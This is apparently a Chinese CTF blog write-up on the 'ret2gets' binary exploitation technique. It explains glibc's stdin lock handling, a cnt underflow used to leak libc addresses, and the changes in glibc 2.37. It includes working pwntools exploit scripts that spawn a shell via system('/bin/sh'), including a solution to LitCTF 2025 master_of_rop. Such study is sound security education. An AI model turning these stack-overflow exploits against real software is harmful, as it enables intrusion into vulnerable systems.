---
title: ret2gets
date: '2025-06-15 09:53:36'
updated: '2025-07-11 23:49:59'
---
[来自 CSDN](https://blog.csdn.net/2502_91269216/article/details/148261096)

ret2gets 常用于没有`pop rdi;ret`这些控制 rdi 的 gadget 时泄露 libc 地址

## 基本原理
gets 刚执行完的寄存器情况：

![](/images/53a33d997fa6825eb8c7ac3018e1834f.png)

这里 rdi 的值是`0x7ffff7e1ca80 (_IO_stdfile_0_lock)`，用 vmmap 看这一段是可写的

![](/images/ba6f675d8775884d0673880e7bb5ac84.png)

### 原因
为什么_IO_stdfile_0_lock要放入到rdi寄存器里面？

上面我们分析的_IO_stdfile_0_lock 的来源，但是为什么要把 _lock 会被加载到 RDI 中?

猜测这是编译器优化的结果，在调用 `lll_unlock` 的情况下，`_lock`的地址作为唯一的参数直接传递给 `futex`包装器（即通过 rdi 寄存器）。因此，它将 _lock 加载到 rdi 中，这样它就不需要使用额外的 `assignment` 来准备对 `futex` 的调用，例如`mov rdi, [register containing _lock]` ，从而节省了空间和时间

### 锁相关
`_IO_stdfile_0_lock`是一个锁对象（实际上是 stdin 的锁），

程序通过控制 _lock 的值来应对条件竞争漏洞

gets 的函数源码：

```c
char *
_IO_gets (char *buf)
{
	size_t count;
	int ch;
	char *retval;

	_IO_acquire_lock (stdin);         //获取锁
	ch = _IO_getc_unlocked (stdin);
	if (ch == EOF)
	{
		retval = NULL;
		goto unlock_return;
	}
	if (ch == '\n')
		count = 0;
	else
	{
		int old_error = stdin->_flags & _IO_ERR_SEEN;
		stdin->_flags &= ~_IO_ERR_SEEN;
		buf[0] = (char) ch;
		count = _IO_getline (stdin, buf + 1, INT_MAX, '\n', 0) + 1;
		if (stdin->_flags & _IO_ERR_SEEN)
		{
			retval = NULL;
			goto unlock_return;
		}
		else
			stdin->_flags |= old_error;
	}
	buf[count] = 0;
	retval = buf;
	unlock_return:
	_IO_release_lock (stdin);         //释放锁
	return retval;
}

```

可以看到

`gets`函数的开头，获取了锁，告知其他线程`stdin`正在使用

`gets`函数的结尾，释放了锁，告知其他线程`stdin`已可用

FILE 结构体里面有各异 `_lock`字段，存着指向`_IO_lock_t`的指针

```c
typedef struct {
    int lock;
    int cnt;
    void *owner;
} _IO_lock_t;
```

所以`_IO_stdfile_0_lock`指向的结构体就是上面这样

有关获取锁和释放锁的宏有很多，但是我们利用这个攻击方法所需要看的就只有两个宏：

`_IO_lock_lock`和`_IO_lock_unlock`

```c
#define _IO_lock_lock(_name) \
  do {									      
    void *__self = THREAD_SELF
    if ((_name).owner != __self)		   //如果持有者不是当前线程
      {									   //那么就需要获取锁
	lll_lock ((_name).lock, LLL_PRIVATE);  //调用底层锁函数 lll_lock（Low-Level Lock）获取锁
        (_name).owner = __self;		       //将owner设为当前线程
      }									      
    ++(_name).cnt;						   //cnt++，表示获取锁的次数
  } while (0)

#define _IO_lock_unlock(_name) 
  do {									   //cnt--，表示释放一次  
    if (--(_name).cnt == 0)				   //如果释放一次后cnt==0，说明这是最后一次释放锁需要执行解锁操作，即让owner=null			      
      {									   
        (_name).owner = NULL;			
	lll_unlock ((_name).lock, LLL_PRIVATE);				      
      }									 //如果释放一次后cnt!=0，意味着后续还需要释放锁，比如当成线程处于递归操作中，就不用解锁     
  } while (0)
```

在这两个宏里，`_name`就是锁本身，在gets调用的过程中，那就是`_IO_stdfile_0_lock`

其中的重点：

+ `owner`很多时候会储存着 TLS 结构体地址，这个地址与libc偏移是固定的，但是当当前线程完全解锁时会被清空
+ `cnt`在释放时会减一，此处存在整数溢出的漏洞

## ret2system
例子：

```c
#include <stdio.h>
#include <stdlib.h>
int main() {
    puts("ret2gets&ret2system");
    char buffer[0x20];  
    gets(buffer);      
    return 0;
}
void backdoor() {
    system("echo hi"); 
}
```

有`system`，也有`gets`，但是没有`/bin/sh\x00`字段，同时也没有有关`rdi`的`gadget`可用

在`ret2gets`的攻击中，`/bin/sh\x00`我们是可以直接注入，并控制rdi指向的

利用方式也非常简单，`gets`执行后，不去动`rdi`的情况下，再次`call gets`，此时就会向`_IO_stdfile_0_lock`中读入内容，这时候传入 binsh 就可以让 gets 结束之后 rdi 指向 binsh

但是要注意的是，在 gets 结束的时候会将`_IO_stdfile_0_lock`里面的`cnt`成员减一，所以在传 binsh 的时候要把第五个字节提前加上 1

```c
from pwn import *
context(arch='amd64',os='linux')
io= process("./gets")
gdb.attach(io)
system=0x401040
gets=0x401050      
pause()
io.recvuntil(b'ret2gets&ret2system\n')

payload1=b'a'*(0x28)+p64(gets)+p64(system)
io.sendline(payload1)

payload2=b'/bin'+p8(u8(b"/")+1)+b'sh'
io.sendline(payload2)
io.interactive()
```

## ret2libc
在这里利用 ret2gets 泄露 libc

### printf 泄露
跟 ret2system 一样，把 binsh 换成格式化字符串就行了，注意第五个字节就行

### puts 泄露
#### 2.30-2.36
我们先分析是如何获取libc的

之前提到，`owner`部分会变成TLS的值，那么我们就希望能够通过puts函数输出这一部分的值

但是，`gets`函数的特性是，读入遇到`\n`才停止，然后把`\n`变成`\0`，而`\0`刚好会截断`puts`的输出，那么我们岂不是泄露不了TLS了？

回到之前讲过的，`cnt`在锁释放后会减一，存在负数溢出

把`cnt`的值在`gets`过程中覆盖为0，那么`cnt`减一后，变成了`0xffffffff`，就成功绕过了

```c
from pwn import *
context(arch='amd64',os='linux')
io= process("./gets")
gdb.attach(io)
puts=0x401030
gets=0x401050
pause()
io.recvuntil(b'ret2gets&ret2system\n')

payload1=b'a'*(0x28)+p64(gets)+p64(puts)+p64(0x0401060)
io.sendline(payload1)

payload2=b'AAAA'+b'\x00'*3
io.sendline(payload2)
io.recvuntil(b'\xff\xff\xff\xff')
leak=u64(io.recv(6).ljust(8,b'\x00'))
libc_base=leak-0x3a4740
info('libc_base:'+hex(libc_base))
io.interactive()
```

#### 2.37+
先看源码`_IO_lock_lock`和`_IO_lock_unlock`的改变

```c
#define _IO_lock_lock(_name) 
  do {									      
    void *__self = THREAD_SELF;						      
    if (SINGLE_THREAD_P && (_name).owner == NULL)	//SINGLE_THREAD_P判断是否是单线程
      {									            //但是重点是owner是不是null
	(_name).lock = LLL_LOCK_INITIALIZER_LOCKED;			      
	(_name).owner = __self;						      
      }									      
    else if ((_name).owner != __self)				//我们的攻击执行的是这个if为真的内容
      {									      
	lll_lock ((_name).lock, LLL_PRIVATE);			
	(_name).owner = __self;						    //让owner拥有TLS地址
      }									      
    else								      
      ++(_name).cnt;							      
  } while (0)

#define _IO_lock_unlock(_name) 
  do {									      
    if (SINGLE_THREAD_P && (_name).cnt == 0)		//最特殊的点，当cnt==0时，不会再-1负数溢出了		      
      {									            //其他的都无所谓
	(_name).owner = NULL;						      
	(_name).lock = 0;						      
      }									      
    else if ((_name).cnt == 0)						      
      {									      
	(_name).owner = NULL;						      
	lll_unlock ((_name).lock, LLL_PRIVATE);				      
      }									      
    else								      
      --(_name).cnt;							   //我们会让cnt!=0，所以会走这里
  } while (0)

```

总结一下：

新增了`SINGLE_THREAD_P`这个宏，但是没关系，我们直接用`(_name).owner == NULL`这个判断去绕过这个情况

`cnt`在等于0时不再减一，就不会负数溢出了

解决方法就是gets两次

第一次`gets`：

`lock`宏不用管

输入

```c
p32(0)+b'A'*4+b'B'*8
```

+ 设置`lock`=0：将锁标记为未锁定状态（LLL_LOCK_INITIALIZER的值为 0）
+ 填充`cnt`为垃圾值：后续操作中会处理这个垃圾值
+ 覆盖`owner`为非 NULL 值：使owner != THREAD_SELF，触发后续锁获取逻辑
+ 结束后，在`unlock`宏里，cnt-1，此时`lock`=0，`cnt`=0x41414140，`owner`是b'BBBBBBBB'

第二次gets：

由于owner!=null，且owner!=self，因此会执行这两句

```c
lll_lock ((_name).lock, LLL_PRIVATE);			
(_name).owner = __self;	
```

由于我们之前设置了lock=0（未锁定状态），这里会将其锁定（设置为 1）

并且让`owner`拥有TLS地址

然后输入

```c
b'BBBB'
```

因为之前把`lock`变成了1，高位的`\x00`会截断，这次读入是为了覆盖`lock`，然后换行符会出现在`cnt`字段，将`cnt`的最低一字节变成`\x00`

结束后的`unlock`宏又会让`cnt`减一，最低一字节就变成了`\xff`，绕过了`puts`的截断

### 在返回时 `rdi != _IO_stdfile_0_lock`的情况
例如：

```c
#include <stdio.h>

int main() {
	char buf[0x20];
	puts("ROP me if you can!");
	gets(buf);
	puts("No lock for you ;)");
}
```

像 gets 这种返回的时候 rdi 放锁的函数有别的吗？有的，兄弟有的（）

这种情况常见于其他 IO 函数，大多数 IO 函数都遵循那种加锁模式

## LitCTF 2025 master_of_rop
这题本地先 patch 了 2.35 版本的 libc，刚开始没仔细看版本，把 2.35 跟 2.37 往后的弄混了，还疑惑说为啥要两次 gets，原来网上搜到的居然是把 libc patch 成 2.37 往上的版本了...（题目 WP 本来是 2.37 之前的版本...）

```python
#!/usr/bin/env python3

from pwn import *
context.log_level = 'debug'
context.arch = 'amd64'
context.os = 'linux'

elf=ELF('./rop')
libc=ELF('.//glibc/2.35-0ubuntu3.9_amd64/libc.so.6')

link=process("./rop")
# gets=0x00000000004011D4
gets=elf.plt['gets']
# puts=0x00000000004011C3
puts=elf.plt['puts']

gdb.attach(link,'b *0x00000000004011DE')
pause()

bss=0x0000000000404040+0x500

payload=b'a'*0x28+p64(gets)+p64(puts)+p64(0x00000000004011AD)
link.sendline(payload)

link.sendline(b'a'*0x4+b'\x00'*0x3)
tls_addr=u64(link.recvuntil('\x7f')[-6:].ljust(8,b'\x00'))
success('tls_addr: ' + hex(tls_addr))
libc_base= tls_addr + 0x28c0
success('libc_base: ' + hex(libc_base))

system=libc_base + libc.sym['system']
binsh=libc_base + next(libc.search(b'/bin/sh\x00'))
rdi=libc_base + 0x000000000002a3e5
link.recvuntil("Welcome to LitCTF2025!\n")
payload= b'a'*0x28+p64(rdi)+p64(binsh)+p64(system)
link.sendline(payload)

link.interactive()
```

